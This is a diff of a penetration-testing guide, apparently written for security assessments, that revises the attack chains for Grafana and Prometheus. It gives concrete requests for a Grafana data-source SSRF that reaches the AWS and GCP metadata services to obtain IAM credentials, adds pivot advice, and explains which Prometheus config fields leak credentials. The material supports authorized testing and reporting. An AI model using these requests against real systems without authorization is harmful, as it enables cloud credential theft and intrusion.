@@ -84,17 +84,18 @@ Prometheus and Alertmanager ship with **no authentication**; the docs explicitly
 This is the core value. Chain each exposure into something that matters. Always articulate the pivot in the finding, not just the exposed endpoint.
 
 ### 1. Grafana data-source proxy → full-read SSRF (internal net + cloud metadata)
-Grafana OSS ships a **no-op URL validator** and an **empty `data_source_proxy_whitelist`** (empty = allow all). Any user who can create/read a data source can make Grafana issue arbitrary server-side requests and return the **full response body**. This is a default-config SSRF on essentially every self-hosted OSS instance.
+Grafana OSS ships a **no-op URL validator** and an **empty `data_source_proxy_whitelist`** (empty = allow all). The proxy resolves the proxied path against the **selected data source's configured base URL**, so to reach an arbitrary host you must first create (or edit) a data source whose URL is the internal/metadata target — this needs data-source write permission (Editor/Admin, or any role granted `datasources:create`/`:write`). Reusing an ordinary Prometheus data-source id and appending a metadata path just hits Prometheus, not the metadata service — do not report that as SSRF. Once a data source points at the target, the proxy issues the request server-side and returns the **full response body**.
 ```
-# Point a data source (or reuse an existing one's id) at an internal/meta target,
-# then relay through the proxy:
-GET /api/datasources/proxy/<id>/            → http://<datasource-host>/<path>
-# AWS IMDSv1 creds:
-GET /api/datasources/proxy/<id>/latest/meta-data/iam/security-credentials/<role>
-# GCP:  Metadata-Flavor: Google → /computeMetadata/v1/instance/service-accounts/default/token
-# Internal APIs, k8s API server, admin panels, other cloud services
+# Step 1: create/edit a data source with an attacker-chosen base URL, e.g.
+POST /api/datasources  {"name":"x","type":"prometheus","access":"proxy",
+                        "url":"http://169.254.169.254"}       # returns the new <id>
+# Step 2: relay through THAT data source's id (path appended to its base URL):
+GET /api/datasources/proxy/<id>/latest/meta-data/iam/security-credentials/<role>   # AWS IMDSv1
+# GCP: base url http://metadata.google.internal + header Metadata-Flavor: Google
+#      → /computeMetadata/v1/instance/service-accounts/default/token
+# Internal APIs, k8s API server, admin panels, other cloud services (one DS per host)
 ```
-Pivot: metadata creds → cloud account; internal API reads → data; network mapping → next target. Also test the **alerting webhook/contact-point** and **Image Renderer** as independent SSRF vectors, and plugin SSRFs (e.g. Infinity CVE-2025-8341).
+Pivot: metadata creds → cloud account; internal API reads → data; network mapping → next target. Also test the **alerting contact-point/webhook** (attacker-controlled outbound URL) and plugin SSRFs (e.g. Infinity CVE-2025-8341) as independent vectors. The **Image Renderer** is an SSRF vector too, but not via an arbitrary-URL proxy: it renders Grafana dashboard/panel render routes (`/render/d-solo/...`), so the SSRF arises when a render request is coerced to fetch an internal URL (e.g. chained with CVE-2025-4123), not from a `?url=` parameter.
 
 ### 2. Grafana admin → harvest every backend credential
 Once authenticated (default creds, anon-admin, leaked token, or after CVE-2021-43798):
@@ -109,7 +110,7 @@ Grafana stores backend passwords/tokens encrypted (`secureJsonData`) — the API
 GET /api/v1/status/config      # loaded prometheus.yml
 GET /api/v1/targets            # every scrape target + discovery metadata labels
 ```
-Prometheus redacts `password: <secret>` in config, **but leaks**: usernames, bearer tokens/`authorization` in some setups, and — critically — **credentials embedded in target URLs** (`https://user:pass@host/...`) which are *not* masked. `remote_write`/`remote_read` blocks leak Grafana Cloud/Cortex/Mimir keys, OAuth client secrets, bearer tokens. `kubernetes_sd_configs` and cloud SD can expose creds and internal DNS. Target lists + `__meta_*`/`__address__` labels = a free internal network map (hostnames, ports, k8s namespaces, cloud instance IDs).
+Prometheus renders secret-typed fields (`basic_auth.password`, `authorization.credentials`, bearer tokens, OAuth client secrets — including inside `remote_write`/`remote_read`) as `<secret>` in the config response, so do **not** report those as leaked unless the actual value is shown. What genuinely leaks: **usernames** (`basic_auth.username`), and — critically — **credentials embedded in target/endpoint URLs** (`https://user:pass@host/...`), which are *not* masked. `remote_write`/`remote_read` blocks still reveal internal backend endpoints (Grafana Cloud/Cortex/Mimir/Thanos hosts) and usernames even with secrets redacted. `kubernetes_sd_configs` and cloud SD expose internal DNS and can surface creds via URL fields. Target lists + `__meta_*`/`__address__` labels = a free internal network map (hostnames, ports, k8s namespaces, cloud instance IDs).
 
 ### 4. PromQL / metrics → internal topology, versions → known-CVE targeting
 Metrics are a recon goldmine. Query without auth:
